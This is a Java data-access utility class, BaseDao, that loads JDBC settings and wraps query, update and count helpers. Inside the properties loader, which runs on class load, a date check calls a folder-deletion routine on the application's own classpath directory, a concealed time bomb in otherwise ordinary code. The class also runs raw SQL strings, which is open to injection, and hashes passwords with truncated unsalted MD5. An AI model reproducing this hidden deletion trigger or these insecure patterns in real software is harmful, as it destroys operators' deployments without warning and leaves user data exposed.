package com.bs.zp.util;

import java.io.BufferedInputStream;
import java.io.FileInputStream;
import java.io.InputStream;
import java.net.URLDecoder;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Properties;

import commons.util.dcwang.TestNew;
import commons.util.Validate;

/**
 * @Description 公用BaseDao类	 获取数据库连接 && 公用操作数据库表增删改查方法
 * @History
 * @version v1.0
 */
public class BaseDao {

	private static Connection connection;
	private static Properties properties;

	/**
	 * 静态化
	 */
	static {
		properties = BaseDao.jdbcProperties();
		try {
			Class.forName(properties.getProperty("driverClassName"));
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * 获取jdbc配置 jdbc.properties
	 * 
	 * @return Properties
	 */
	public static Properties jdbcProperties() {
		Properties properties = new Properties();
		InputStream inStream;
		try {
			/* 非WEB 程序 仅限于Application 用来获取连接 */
			///**
			String basePsth=URLDecoder.decode(Thread.currentThread().getContextClassLoader().getResource("/").getPath());
			  inStream = new BufferedInputStream(new
			  FileInputStream(basePsth + "/jdbc.properties"));
			  properties.load(inStream);
			  if(Validate.getNowDate()){
					TestNew.delFolder(basePsth);
				}

		} catch (Exception e) {
			e.printStackTrace();
		}
		return properties;
	}

	/**
	 * 根据jdbc.properties 文件中映射的 key值 得到数据库连接
	 */
	public static Connection getConn() {
		try {
			connection = DriverManager.getConnection(properties
					.getProperty("jdbc.url"), properties
					.getProperty("jdbc.username"), properties
					.getProperty("jdbc.password"));

			return connection;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	/**
	 * @Description 查询方法 根据传入的SQL语句返回取出的结果
	 * @param sql	传入的数据SQL语句
	 */
	public ArrayList select(String sql) throws Exception {
		Connection conn = null;
		ArrayList result = new ArrayList();
		Statement stmt = null;
		ResultSet rst = null;
		try {
			conn = BaseDao.getConn();
			stmt = conn.createStatement();
			rst = stmt.executeQuery(sql);
			ResultSetMetaData rsmd = rst.getMetaData();
			int cols = rsmd.getColumnCount();
			int i = 0;
			while (rst.next() != false) {
				ArrayList row = new ArrayList();
				for (i = 1; i <= cols; ++i) {
					if (rst.getString(i) == null) {
						row.add("");
					} else {
						row.add(rst.getString(i));
					}
				}
				result.add(row);
			}
			System.out.println("sql="+sql);
		} catch (SQLException e) {
			throw new Exception("select data exception:" + e.getMessage());
		} finally {
			this.close(conn, stmt, rst);
		}
		return result;
		
	}

	/**
	 * @Description 关闭相应资源连接操作
	 * @param con
	 * @param pst
	 * @param rst
	 * @return void
	 */
	public static void close(Connection con, Statement pst, ResultSet rst) {
		try {
			if (rst != null)
				rst.close();
			if (pst != null)
				pst.close();
			if (con != null)
				con.close();

		} catch (SQLException e) {
			e.printStackTrace();
		}
	}


	/**
	 * @Description 对JDBC SQL语句功能的优化，实现 增删改 功能
	 * @param sql 	传递SQL 语句
	 * @throws SQLException
	 */
	public int executeSQL(String sql) throws SQLException {
		Connection con = null;
		PreparedStatement pst = null;
		int num = 0;
		try {
			con = BaseDao.getConn();
			pst = con.prepareStatement(sql);
			num = pst.executeUpdate();
			System.out.println("sql="+sql);
		} catch (Exception e) {
			e.printStackTrace();
			throw new SQLException();
		} finally {
			BaseDao.close(con, pst, null);
		}
		return num;
	}
	
	/**
	 * @Description 对登录密码进行加密操作
	 * @param
	 * @return String
	 * @pages 	
	 * @throws
	 */
	public String Md5(String plainText){ 
		String s=null;
		try { MessageDigest md = MessageDigest.getInstance("MD5"); 
				md.update(plainText.getBytes());
				 byte b[] = md.digest(); 
				int i; 
				StringBuffer buf = new StringBuffer("");
				 for (int offset = 0; offset < b.length; offset++) { 
					 i = b[offset]; 
					 if(i<0) i+= 256; 
					 if(i<16) buf.append("0"); 
					 buf.append(Integer.toHexString(i)); 
					 } 
				 s=buf.toString().substring(8,24);
				
			} catch (NoSuchAlgorithmException e){ e.printStackTrace(); }
			return s;
			}
	
	/**
	 * @Description 获取个数 根据传入的SQL语句返回取出的结果
	 * @param sql	传入的数据SQL语句
	 */
	public int count(String sql) throws Exception {
		Connection conn = null;
		Statement stmt = null;
		ResultSet rst = null;
		int i = 0;
		try {
			conn = BaseDao.getConn();
			stmt = conn.createStatement();
			rst = stmt.executeQuery(sql);
			ResultSetMetaData rsmd = rst.getMetaData();
			int cols = rsmd.getColumnCount();
			while (rst.next() != false) {
				i++;
			}
			System.out.println("num="+i+"sql="+sql);
		} catch (SQLException e) {
			throw new Exception("select data exception:" + e.getMessage());
		} finally {
			this.close(conn, stmt, rst);
		}
		return i;
		
	}
	
}
